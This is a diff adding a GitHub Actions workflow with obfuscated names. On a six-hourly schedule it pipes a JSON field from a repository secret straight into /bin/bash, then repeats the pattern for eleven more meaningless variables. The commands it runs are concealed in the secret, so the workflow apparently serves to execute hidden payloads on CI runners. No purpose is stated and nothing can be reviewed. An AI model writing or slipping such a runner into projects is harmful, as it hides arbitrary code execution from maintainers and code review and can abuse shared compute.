@@ -1,0 +1,29 @@
+name: zhengwangzhufa
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhengwangzhufa
+        env:
+          adgs4019: ${{ secrets.adgs4019 }}
+        run: |
+          echo $adgs4019 | jq -r .wzlo205 | /bin/bash
+          echo $t58381 | jq -r .dc83 | /bin/bash
+          echo $xxb768 | jq -r .dq01 | /bin/bash
+          echo $s8 | jq -r .x9199 | /bin/bash
+          echo $dur9 | jq -r .hycsr5 | /bin/bash
+          echo $xrnwu4 | jq -r .c59 | /bin/bash
+          echo $fzvv61538 | jq -r .scznx44 | /bin/bash
+          echo $z42940 | jq -r .lmwul7 | /bin/bash
+          echo $i5627 | jq -r .dlkse423 | /bin/bash
+          echo $s8 | jq -r .ct93 | /bin/bash
+          echo $gsu91 | jq -r .ggu75 | /bin/bash
+          echo $vq47577 | jq -r .d133 | /bin/bash
+
